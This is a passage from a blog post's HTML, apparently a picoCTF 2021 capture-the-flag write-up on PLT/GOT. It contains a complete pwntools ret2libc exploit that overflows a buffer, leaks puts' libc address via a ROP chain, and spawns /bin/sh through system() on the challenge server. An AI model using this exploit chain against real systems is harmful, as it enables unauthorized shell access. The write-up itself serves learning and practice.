+<p>Reference: <a href="https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got">https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got</a></p>
+<p>PLT: Procedure Linkage Table which is used to call external procedures/functions
+whose address isn&rsquo;t known in the time of linking and is left to be resolved by
+the dynamic linker at run time</p>
+<p>PLT is a readable section of memory that jumps to the GOT to call a function.
+GOT by extension is a writable section of memory that looks up the function
+pointers through the dynamic linker the first time it is called.</p>
+<h3 id="solution">Solution<a hidden class="anchor" aria-hidden="true" href="#solution">#</a></h3>
+<p><code>pwntools</code> provides many great features and we can utilize one of the features
+to get the plt/got address to <code>puts</code> and <code>main</code> functions.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>vuln <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln_patched&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./vuln_patched&#39;</span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># r = vuln.process()</span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;mercury.picoctf.net&#34;</span>, <span style="color:#ae81ff">1774</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># get the address to the puts function in PLT</span>
+</span></span><span style="display:flex;"><span>puts_plt <span style="color:#f92672">=</span> vuln<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># get the addres to the main function in PLT</span>
+</span></span><span style="display:flex;"><span>main_plt <span style="color:#f92672">=</span> vuln<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;main&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># As the GOT is part of the binary, it will always be a constant offset away from the base</span>
+</span></span><span style="display:flex;"><span>puts_got <span style="color:#f92672">=</span> vuln<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># this is the gadget &#39;pop rdi, ret&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># why this? here is a great article that explains this well</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/gadgets</span>
+</span></span><span style="display:flex;"><span>gadget <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400913</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">136</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(gadget)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(puts_got)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(puts_plt)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(main_plt)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#r.interactive()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># second rop</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>received_line <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>print(received_line)
+</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> u64(received_line<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>print(hex(leak))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Once we get the pointers to to puts&#39; plt/got and main&#39;s address (the purpose</span>
+</span></span><span style="display:flex;"><span>of the first payload),
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># we can get libc address using libc.sysmbols[&#39;puts&#39;]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;puts&#39;</span>] <span style="color:#75715e"># now we have the base libc addr</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>binsh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>)) <span style="color:#75715e"># the actual string is the next one from the memory address that is being pointed to</span>
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">136</span>
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x000000000040052e</span>) <span style="color:#75715e"># ret instruction (gadget) to algin the stack</span>
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">+=</span> p64(gadget) <span style="color:#75715e"># pop rdi, ret</span>
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">+=</span> p64(binsh) <span style="color:#75715e"># this will be put into rdi</span>
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">+=</span> p64(system) <span style="color:#75715e"># call system with /bin/sh as its first arg</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>clean()
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(payload2)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>This was a very interesting challenge that taught me a lot of things. Please let
+me know if I missed something or if my understanding is not correct by sending
+me an email. Thanks for reading!</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://joonkim0625.github.io/tags/ctf/">CTF</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/picoctf2021/">Picoctf2021</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/cybersecurity/">Cybersecurity</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/binary-exploit/">Binary Exploit</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://joonkim0625.github.io/">All Things Cyber – joonkim0625</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
